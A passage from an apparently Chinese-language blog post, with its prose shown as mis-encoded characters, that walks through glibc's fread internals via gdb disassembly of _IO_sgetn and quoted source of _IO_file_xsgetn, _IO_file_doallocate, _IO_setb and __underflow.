[rsp+0x10],rsi<br>0x7ffff7e0d09a &lt;__GI__IO_sgetn+74&gt;:  mov    QWORD PTR [rsp+0x8],rdi<br>0x7ffff7e0d09f &lt;__GI__IO_sgetn+79&gt;:  call   0x7ffff7e08f70 &lt;_IO_vtable_check&gt;<br>0x7ffff7e0d0a4 &lt;__GI__IO_sgetn+84&gt;:  mov    rax,QWORD PTR [rbx+0x40]<br>0x7ffff7e0d0a8 &lt;__GI__IO_sgetn+88&gt;:  mov    rdx,QWORD PTR [rsp+0x18]<br>0x7ffff7e0d0ad &lt;__GI__IO_sgetn+93&gt;:  mov    rsi,QWORD PTR [rsp+0x10]<br>0x7ffff7e0d0b2 &lt;__GI__IO_sgetn+98&gt;:  mov    rdi,QWORD PTR [rsp+0x8]<br>0x7ffff7e0d0b7 &lt;__GI__IO_sgetn+103&gt;: add    rsp,0x20   <br>0x7ffff7e0d0bb &lt;__GI__IO_sgetn+107&gt;: pop    rbx<br>0x7ffff7e0d0bc &lt;__GI__IO_sgetn+108&gt;: jmp    rax<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆåˆ†æå‰åŠéƒ¨åˆ†ï¼Œå³<strong>jbe</strong>ä¹‹å‰çš„éƒ¨åˆ†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x7ffff7e0d055 &lt;__GI__IO_sgetn+5&gt;:   lea    rcx,[rip+0x1879a4]        # 0x7ffff7f94a00 &lt;_IO_helper_jumps&gt;<br>0x7ffff7e0d05c &lt;__GI__IO_sgetn+12&gt;:  lea    rax,[rip+0x188705]        # 0x7ffff7f95768<br>0x7ffff7e0d063 &lt;__GI__IO_sgetn+19&gt;:  sub    rax,rcx<br>0x7ffff7e0d066 &lt;__GI__IO_sgetn+22&gt;:  sub    rsp,0x20<br>0x7ffff7e0d06a &lt;__GI__IO_sgetn+26&gt;:  mov    rbx,QWORD PTR [rdi+0xd8]<br>0x7ffff7e0d071 &lt;__GI__IO_sgetn+33&gt;:  mov    r8,rbx<br>0x7ffff7e0d074 &lt;__GI__IO_sgetn+36&gt;:  sub    r8,rcx<br>0x7ffff7e0d077 &lt;__GI__IO_sgetn+39&gt;:  cmp    rax,r8<br>0x7ffff7e0d07a &lt;__GI__IO_sgetn+42&gt;:  jbe    0x7ffff7e0d090 &lt;__GI__IO_sgetn+64&gt;<br></code></pre></td></tr></table></figure><p><strong>rdi</strong>æŒ‡å‘çš„å°±æ˜¯<code>IO_FILE</code>ç»“æ„ä½“å¼€å¤´ï¼Œæ‰€ä»¥<strong>rdi+0xd8</strong>å°±æ˜¯<strong>vtable</strong>æŒ‡å‘çš„å€¼ï¼Œå…¶å®å°±æ˜¯åˆ¤æ–­<strong>rax</strong>æ˜¯å¦å°äºç­‰äº<strong>vtable</strong>ï¼Œç„¶åå†³å®šè·³è½¬ã€‚</p><ul><li>å¦‚æœæ­¤æ—¶ä¸è·³è½¬ï¼Œå³<strong>vtable &gt; rax</strong>ï¼Œä¼šè·³è½¬åˆ°å°†<strong>rbx+0x40</strong>çš„åœ°æ–¹ï¼Œè€Œç”±å‰åŠéƒ¨åˆ†ï¼Œæˆ‘ä»¬çŸ¥é“<strong>rbx</strong>å°±æ˜¯<strong>vtable</strong></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x7ffff7e0d07c &lt;__GI__IO_sgetn+44&gt;:  mov    rax,QWORD PTR [rbx+0x40]<br>0x7ffff7e0d080 &lt;__GI__IO_sgetn+48&gt;:  add    rsp,0x20<br>0x7ffff7e0d084 &lt;__GI__IO_sgetn+52&gt;:  pop    rbx<br>0x7ffff7e0d085 &lt;__GI__IO_sgetn+53&gt;:  jmp    rax<br></code></pre></td></tr></table></figure><ul><li>å¦‚æœæ­¤æ—¶è·³è½¬ï¼Œå³<strong>vtable &lt;&#x3D; rax</strong>ï¼ŒåŒæ ·ä¼šè·³è½¬åˆ°<strong>rbx+0x40</strong>çš„åœ°æ–¹ï¼Œä¸è¿‡åŒºåˆ«æ˜¯å…ˆè¿›è¡Œäº†ä¸€æ¬¡vtableçš„check</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0x7ffff7e0d090 &lt;__GI__IO_sgetn+64&gt;:  mov    QWORD PTR [rsp+0x18],rdx<br>0x7ffff7e0d095 &lt;__GI__IO_sgetn+69&gt;:  mov    QWORD PTR [rsp+0x10],rsi<br>0x7ffff7e0d09a &lt;__GI__IO_sgetn+74&gt;:  mov    QWORD PTR [rsp+0x8],rdi<br>0x7ffff7e0d09f &lt;__GI__IO_sgetn+79&gt;:  call   0x7ffff7e08f70 &lt;_IO_vtable_check&gt;<br>0x7ffff7e0d0a4 &lt;__GI__IO_sgetn+84&gt;:  mov    rax,QWORD PTR [rbx+0x40]<br>0x7ffff7e0d0a8 &lt;__GI__IO_sgetn+88&gt;:  mov    rdx,QWORD PTR [rsp+0x18]<br>0x7ffff7e0d0ad &lt;__GI__IO_sgetn+93&gt;:  mov    rsi,QWORD PTR [rsp+0x10]<br>0x7ffff7e0d0b2 &lt;__GI__IO_sgetn+98&gt;:  mov    rdi,QWORD PTR [rsp+0x8]<br>0x7ffff7e0d0b7 &lt;__GI__IO_sgetn+103&gt;: add    rsp,0x20<br>0x7ffff7e0d0bb &lt;__GI__IO_sgetn+107&gt;: pop    rbx<br>0x7ffff7e0d0bc &lt;__GI__IO_sgetn+108&gt;: jmp    rax<br></code></pre></td></tr></table></figure><h3 id="IO-file-xsgetn"><a href="#IO-file-xsgetn" class="headerlink" title="_IO_file_xsgetn"></a>_IO_file_xsgetn</h3><p><img src="/img/article/fread/image-20221207172245186.png" alt="image-20221207172245186"></p><p>æ ¹æ®gdbåŠ¨è°ƒçš„ç»“æœï¼Œ<strong>rbx+0x40</strong>å³<strong>vtable</strong>åç§»ä¸º0x40å¤„çš„å‡½æ•°æ˜¯<code>_IO_file_xsgetn</code>ï¼Œåœ¨æºç ä¸­å¯ä»¥æŸ¥åˆ°å…¶å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L1271</span><br><span class="hljs-type">size_t</span><br>_IO_file_xsgetn (FILE *fp, <span class="hljs-type">void</span> *data, <span class="hljs-type">size_t</span> n)<br>&#123;<br>  <span class="hljs-type">size_t</span> want, have;<br>  <span class="hljs-type">ssize_t</span> count;<br>  <span class="hljs-type">char</span> *s = data;<br><br>  want = n;<br><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Maybe we already have a push back pointer.  */</span><br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_save_base != <span class="hljs-literal">NULL</span>)<br>&#123;<br>  <span class="hljs-built_in">free</span> (fp-&gt;_IO_save_base);<br>  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;<br>&#125;<br>      _IO_doallocbuf (fp);<br>    &#125;<br><br>  <span class="hljs-keyword">while</span> (want &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;<br>      <span class="hljs-keyword">if</span> (want &lt;= have)<br>&#123;<br>  <span class="hljs-built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);<br>  fp-&gt;_IO_read_ptr += want;<br>  want = <span class="hljs-number">0</span>;<br>&#125;<br>      <span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (have &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);<br>      want -= have;<br>      fp-&gt;_IO_read_ptr += have;<br>    &#125;<br><br>  <span class="hljs-comment">/* Check for backup and repeat */</span><br>  <span class="hljs-keyword">if</span> (_IO_in_backup (fp))<br>    &#123;<br>      _IO_switch_to_main_get_area (fp);<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>  <span class="hljs-comment">/* If we now want less than a buffer, underflow and repeat</span><br><span class="hljs-comment">     the copy.  Otherwise, _IO_SYSREAD directly to</span><br><span class="hljs-comment">     the user buffer. */</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base<br>      &amp;&amp; want &lt; (<span class="hljs-type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<br>    &#123;<br>      <span class="hljs-keyword">if</span> (__underflow (fp) == EOF)<br><span class="hljs-keyword">break</span>;<br><br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>  <span class="hljs-comment">/* These must be set before the sysread as we might longjmp out</span><br><span class="hljs-comment">     waiting for input. */</span><br>  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);<br>  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);<br><br>  <span class="hljs-comment">/* Try to maintain alignment: read a whole number of blocks.  */</span><br>  count = want;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base)<br>    &#123;<br>      <span class="hljs-type">size_t</span> block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;<br>      <span class="hljs-keyword">if</span> (block_size &gt;= <span class="hljs-number">128</span>)<br>count -= want % block_size;<br>    &#125;<br><br>  count = _IO_SYSREAD (fp, s, count);<br>  <span class="hljs-keyword">if</span> (count &lt;= <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (count == <span class="hljs-number">0</span>)<br>fp-&gt;_flags |= _IO_EOF_SEEN;<br>      <span class="hljs-keyword">else</span><br>fp-&gt;_flags |= _IO_ERR_SEEN;<br><br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>  s += count;<br>  want -= count;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)<br>    _IO_pos_adjust (fp-&gt;_offset, count);<br>&#125;<br>    &#125;<br><br>  <span class="hljs-keyword">return</span> n - want;<br>&#125;<br>libc_hidden_def (_IO_file_xsgetn)<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æŠŠè¿™æ®µä»£ç æ‹†åˆ†æˆå‡ ä¸ªéƒ¨åˆ†åˆ†åˆ«æ¥è¿›è¡Œåˆ†æ</p><h4 id="Part-1"><a href="#Part-1" class="headerlink" title="Part-1"></a>Part-1</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Maybe we already have a push back pointer.  */</span><br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_save_base != <span class="hljs-literal">NULL</span>)<br>&#123;<br>  <span class="hljs-built_in">free</span> (fp-&gt;_IO_save_base);<br>  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;<br>&#125;<br>      _IO_doallocbuf (fp);<br>    &#125;<br></code></pre></td></tr></table></figure><p>å¼€å¤´æ˜¯ä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœ <strong>_IO_buf_base</strong> ä¸ºç©ºå³ä»£è¡¨ä¹Ÿè®¸å·²ç»å­˜åœ¨ä¸€ä¸ª <strong>push back pointer</strong>ï¼Œç„¶åä¼šæ£€æŸ¥ <strong>_IO_save_base</strong>æ˜¯å¦ä¸ºç©ºã€‚å¦‚æœä¸ç©ºï¼Œå°±ä¼šfreeæ‰è¿™ä¸ªæŒ‡é’ˆï¼Œå¹¶ä¸”å°† <strong>_IO_IN_BACKUP</strong>è¿™ä¸€ä½ç½®é›¶ã€‚ç„¶åè°ƒç”¨<code>_IO_doallocbuf</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/latest/source/libio/genops.c#L342</span><br><span class="hljs-type">void</span><br>_IO_doallocbuf (FILE *fp)<br>&#123;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base)<br>    <span class="hljs-keyword">return</span>;<br>  <span class="hljs-keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED) || fp-&gt;_mode &gt; <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">if</span> (_IO_DOALLOCATE (fp) != EOF)<br>      <span class="hljs-keyword">return</span>;<br>  _IO_setb (fp, fp-&gt;_shortbuf, fp-&gt;_shortbuf+<span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>&#125;<br>libc_hidden_def (_IO_doallocbuf)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¦‚æœ<strong>fp-&gt;_IO_buf_base</strong> éç©ºï¼Œä»£è¡¨å·²ç»åˆå§‹åŒ–å®Œæˆï¼Œç›´æ¥è¿”å›ã€‚åä¹‹åœ¨æ£€æµ‹<strong>flag</strong>ä¹‹åè°ƒç”¨<code>_IO_DOALLOCATE</code>ï¼Œå…¶å®å°±æ˜¯<code>_IO_file_doallocate </code>å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/latest/source/libio/filedoalloc.c#L77</span><br><span class="hljs-type">int</span><br>_IO_file_doallocate (FILE *fp)<br>&#123;<br>  <span class="hljs-type">size_t</span> size;<br>  <span class="hljs-type">char</span> *p;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> __<span class="hljs-title">stat64_t64</span> <span class="hljs-title">st</span>;</span><br><br>  size = BUFSIZ;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_fileno &gt;= <span class="hljs-number">0</span> &amp;&amp; __builtin_expect (_IO_SYSSTAT (fp, &amp;st), <span class="hljs-number">0</span>) &gt;= <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (S_ISCHR (st.st_mode))<br>&#123;<br>  <span class="hljs-comment">/* Possibly a tty.  */</span><br>  <span class="hljs-keyword">if</span> (<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> DEV_TTY_P</span><br>      DEV_TTY_P (&amp;st) ||<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      local_isatty (fp-&gt;_fileno))<br>    fp-&gt;_flags |= _IO_LINE_BUF;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _STATBUF_ST_BLKSIZE</span><br>      <span class="hljs-keyword">if</span> (st.st_blksize &gt; <span class="hljs-number">0</span> &amp;&amp; st.st_blksize &lt; BUFSIZ)<br>size = st.st_blksize;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>  p = <span class="hljs-built_in">malloc</span> (size);<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (p == <span class="hljs-literal">NULL</span>))<br>    <span class="hljs-keyword">return</span> EOF;<br>  _IO_setb (fp, p, p + size, <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br>libc_hidden_def (_IO_file_doallocate)<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°ä¸»è¦å¯¹<code>_IO_FILE</code>è¿›è¡Œåˆå§‹åŒ–ï¼Œ</p><ul><li>é¦–å…ˆï¼Œå¯¹<strong>fileno</strong>åšæœ€åŸºæœ¬çš„æ£€æµ‹ï¼Œç„¶åè°ƒç”¨<code>__stat</code>ï¼Œç”¨äºè·å–æ–‡ä»¶ä¿¡æ¯</li><li>ç„¶åè°ƒç”¨mallocç”³è¯·ä¸€ä¸ªç©ºé—´</li><li>è°ƒç”¨<code>_IO_setb</code>,å¯¹ <strong>_IO_buf_base</strong>å’Œ <strong>_IO_buf_end</strong>è¿›è¡Œäº†èµ‹å€¼ä¸ºåˆšåˆšç”³è¯· <strong>chunk</strong>çš„ <strong>p</strong>å’Œ <strong>p+1</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/latest/source/libio/genops.c#L328</span><br><span class="hljs-type">void</span><br>_IO_setb (FILE *f, <span class="hljs-type">char</span> *b, <span class="hljs-type">char</span> *eb, <span class="hljs-type">int</span> a)<br>&#123;<br>  <span class="hljs-keyword">if</span> (f-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags &amp; _IO_USER_BUF))<br>    <span class="hljs-built_in">free</span> (f-&gt;_IO_buf_base);<br>  f-&gt;_IO_buf_base = b;<br>  f-&gt;_IO_buf_end = eb;<br>  <span class="hljs-keyword">if</span> (a)<br>    f-&gt;_flags &amp;= ~_IO_USER_BUF;<br>  <span class="hljs-keyword">else</span><br>    f-&gt;_flags |= _IO_USER_BUF;<br>&#125;<br>libc_hidden_def (_IO_setb)<br></code></pre></td></tr></table></figure><h4 id="Part-2"><a href="#Part-2" class="headerlink" title="Part-2"></a>Part-2</h4><p>è¿™é‡Œå¼€å§‹ä¾¿æ˜¯è¯»å…¥çš„ä¸»ä½“éƒ¨åˆ†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (want &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      have = fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr;<br>      <span class="hljs-keyword">if</span> (want &lt;= have)<br>&#123;<br>  <span class="hljs-built_in">memcpy</span> (s, fp-&gt;_IO_read_ptr, want);<br>  fp-&gt;_IO_read_ptr += want;<br>  want = <span class="hljs-number">0</span>;<br>&#125;<br>      <span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (have &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      s = __mempcpy (s, fp-&gt;_IO_read_ptr, have);<br>      want -= have;<br>      fp-&gt;_IO_read_ptr += have;<br>    &#125;<br><br>  <span class="hljs-comment">/* Check for backup and repeat */</span><br>  <span class="hljs-keyword">if</span> (_IO_in_backup (fp))<br>    &#123;<br>      _IO_switch_to_main_get_area (fp);<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>  <span class="hljs-comment">/* If we now want less than a buffer, underflow and repeat</span><br><span class="hljs-comment">     the copy.  Otherwise, _IO_SYSREAD directly to</span><br><span class="hljs-comment">     the user buffer. */</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base<br>      &amp;&amp; want &lt; (<span class="hljs-type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<br>    &#123;<br>      <span class="hljs-keyword">if</span> (__underflow (fp) == EOF)<br><span class="hljs-keyword">break</span>;<br><br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br><br>  <span class="hljs-comment">/* These must be set before the sysread as we might longjmp out</span><br><span class="hljs-comment">     waiting for input. */</span><br>  _IO_setg (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);<br>  _IO_setp (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_base);<br><br>  <span class="hljs-comment">/* Try to maintain alignment: read a whole number of blocks.  */</span><br>  count = want;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base)<br>    &#123;<br>      <span class="hljs-type">size_t</span> block_size = fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base;<br>      <span class="hljs-keyword">if</span> (block_size &gt;= <span class="hljs-number">128</span>)<br>count -= want % block_size;<br>    &#125;<br><br>  count = _IO_SYSREAD (fp, s, count);<br>  <span class="hljs-keyword">if</span> (count &lt;= <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (count == <span class="hljs-number">0</span>)<br>fp-&gt;_flags |= _IO_EOF_SEEN;<br>      <span class="hljs-keyword">else</span><br>fp-&gt;_flags |= _IO_ERR_SEEN;<br><br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>  s += count;<br>  want -= count;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)<br>    _IO_pos_adjust (fp-&gt;_offset, count);<br>&#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å¦‚æœï¼Œéœ€è¦è¯»å…¥çš„é•¿åº¦å°äºå½“å‰<code>_IO_read_end</code>åˆ°<code>_IO_read_ptr</code>çš„åŒºé—´ï¼Œå°±ä¼šç›´æ¥ç”¨<code>memcpy</code>è¿›è¡Œæ‹·è´èµ‹å€¼ã€‚å¦‚æœä¸è¶³çš„è¯ï¼Œå°±ä¼šä¸æ–­è°ƒæ•´æŒ‡é’ˆåŒæ ·ç”¨<code>memcpy</code> è¿›è¡Œæ‹·è´ã€‚ç›´åˆ°è¯»å®Œæˆï¼Œç„¶åè¿”å›<strong>n-want</strong> å³æ€»è¯»å…¥å­—ç¬¦æ•°ã€‚</p><h4 id="part-3"><a href="#part-3" class="headerlink" title="part-3"></a>part-3</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">......<br><span class="hljs-comment">/* If we now want less than a buffer, underflow and repeat</span><br><span class="hljs-comment">     the copy.  Otherwise, _IO_SYSREAD directly to</span><br><span class="hljs-comment">     the user buffer. */</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base<br>      &amp;&amp; want &lt; (<span class="hljs-type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<br>    &#123;<br>      <span class="hljs-keyword">if</span> (__underflow (fp) == EOF)<br><span class="hljs-keyword">break</span>;<br><br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>......  <br></code></pre></td></tr></table></figure><p>åœ¨è¯»å…¥çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœé‡åˆ°ç©ºé—´ä¸è¶³çš„æƒ…å†µï¼Œä¼šè°ƒç”¨<code>__underflow</code>å»æ‰§è¡Œç³»ç»Ÿè°ƒç”¨<code>read</code>è¯»å–æ•°æ®ï¼Œå¹¶æ”¾å…¥åˆ°è¾“å…¥ç¼“å†²åŒºé‡Œã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/latest/source/libio/genops.c#L268</span><br><span class="hljs-type">int</span><br>__underflow (FILE *fp)<br>&#123;<br>  <span class="hljs-keyword">if</span> (_IO_vtable_offset (fp) == <span class="hljs-number">0</span> &amp;&amp; _IO_fwide (fp, <span class="hljs-number">-1</span>) != <span class="hljs-number">-1</span>)<br>    <span class="hljs-keyword">return</span> EOF;<br><br>  <span class="hljs-keyword">if</span> (fp-&gt;_mode == <span class="hljs-number">0</span>)<br>    _IO_fwide (fp, <span class="hljs-number">-1</span>);<br>  <span class="hljs-keyword">if</span> (_IO_in_put_mode (fp))<br>    <span class="hljs-keyword">if</span> (_IO_switch_to_get_mode (fp) == EOF)<br>      <span 